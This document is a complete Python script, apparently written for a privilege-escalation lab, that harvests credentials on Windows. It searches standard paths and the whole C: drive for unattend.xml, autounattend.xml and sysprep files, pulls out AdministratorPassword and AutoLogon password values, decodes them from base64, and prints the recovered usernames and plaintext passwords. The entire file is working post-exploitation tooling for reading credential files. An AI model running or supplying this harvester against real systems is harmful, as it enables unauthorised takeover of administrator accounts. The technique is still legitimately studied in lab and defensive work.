#!/usr/bin/env python3
"""
extract_password.py
Windows Privilege Escalation - Unattended Install Credential Harvester

Handles the common lab "gotcha": the <PlainText> flag in unattend.xml
can't always be trusted. Even when it says true, the <Value> may still
be base64-encoded. This script always attempts to decode first, and
only falls back to literal plaintext if decoding fails or produces
non-printable garbage.
"""

import os
import re
import sys
import base64
import argparse
import subprocess

TARGET_FILENAMES = ["sysprep.inf", "autounattend.xml", "unattend.xml"]

CANDIDATE_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\sysprep\sysprep.xml",
    r"C:\Windows\System32\sysprep.inf",
    r"C:\Windows\System32\sysprep\Panther\unattend.xml",
    r"C:\unattend.xml",
    r"C:\autounattend.xml",
]

SEARCH_ROOTS = [r"C:\Windows\Panther", r"C:\Windows\System32\sysprep", "C:\\"]

# Matches AdministratorPassword AND AutoLogon Password blocks
CRED_BLOCK_RE = re.compile(
    r"<(AdministratorPassword|Password)>\s*<Value>(.*?)</Value>\s*"
    r"(?:<PlainText>(.*?)</PlainText>)?",
    re.IGNORECASE | re.DOTALL,
)

# The AutoLogon username, if present, so we know which account the password belongs to
AUTOLOGON_USER_RE = re.compile(r"<AutoLogon>.*?<Username>(.*?)</Username>", re.IGNORECASE | re.DOTALL)

MAGIC_SUFFIX = "AdministratorPassword"


def find_target_files():
    found = []
    for path in CANDIDATE_PATHS:
        if os.path.isfile(path):
            found.append(path)
    for root_dir in SEARCH_ROOTS:
        if not os.path.isdir(root_dir):
            continue
        for root, _dirs, files in os.walk(root_dir):
            for fname in files:
                if fname.lower() in (t.lower() for t in TARGET_FILENAMES):
                    full = os.path.join(root, fname)
                    if full not in found:
                        found.append(full)
    return found


def try_decode(b64_value):
    """
    Try, in order:
      1. base64 -> utf-16le -> strip 'AdministratorPassword' suffix (spec-correct
         behavior for PlainText=false)
      2. plain base64 -> utf-8 (what this lab actually uses despite PlainText=true)
      3. literal value as-is (genuinely already plaintext)
    Returns the best printable candidate.
    """
    def is_ascii_printable(s):
        return bool(s) and all(32 <= ord(ch) < 127 for ch in s)

    candidates = []

    padded = b64_value + "=" * (-len(b64_value) % 4)

    # Attempt plain UTF-8 decode of base64 FIRST (this lab's actual behavior,
    # and the most common real-world case in general)
    try:
        raw = base64.b64decode(padded)
        utf8 = raw.decode("utf-8", errors="ignore")
        if is_ascii_printable(utf8):
            candidates.append(utf8)
    except Exception:
        pass

    # Attempt UTF-16LE decode (spec behavior for PlainText=false) as a fallback
    try:
        raw = base64.b64decode(padded)
        utf16 = raw.decode("utf-16le", errors="ignore")
        if utf16.endswith(MAGIC_SUFFIX):
            utf16 = utf16[: -len(MAGIC_SUFFIX)]
        if is_ascii_printable(utf16):
            candidates.append(utf16)
    except Exception:
        pass

    # Final fallback: treat as literal plaintext
    if is_ascii_printable(b64_value):
        candidates.append(b64_value)

    return candidates[0] if candidates else None


def extract_credentials(filepath):
    """Return a list of (username_hint, password) tuples found in the file."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except OSError as e:
        print(f"[!] Could not read {filepath}: {e}")
        return []

    user_match = AUTOLOGON_USER_RE.search(content)
    autologon_user = user_match.group(1).strip() if user_match else None

    results = []
    for tag, b64_value, plaintext_flag in CRED_BLOCK_RE.findall(content):
        b64_value = b64_value.strip()
        decoded = try_decode(b64_value)
        if not decoded:
            continue
        username = autologon_user if tag.lower() == "password" and autologon_user else "Administrator"
        results.append((username, decoded, tag))

    return results


def main():
    parser = argparse.ArgumentParser(description="Extract admin creds from unattended install files.")
    parser.add_argument("--scan-only", action="store_true", help="Only find/print credentials.")
    parser.add_argument("--file", help="Analyze a specific file instead of scanning the filesystem.")
    args = parser.parse_args()

    if args.file:
        targets = [args.file]
    else:
        print("[*] Scanning for unattended installation files...")
        targets = find_target_files()
        if not targets:
            print("[!] No unattended install files found on this system.")
            sys.exit(1)
        print(f"[+] Found {len(targets)} candidate file(s):")
        for t in targets:
            print(f"    - {t}")

    any_found = False
    for path in targets:
        creds = extract_credentials(path)
        for username, password, tag in creds:
            any_found = True
            print(f"\n[+] Source: {path}  ({tag})")
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")

    if not any_found:
        print("[!] No credentials could be extracted/decoded.")
        sys.exit(1)


if __name__ == "__main__":
    main()
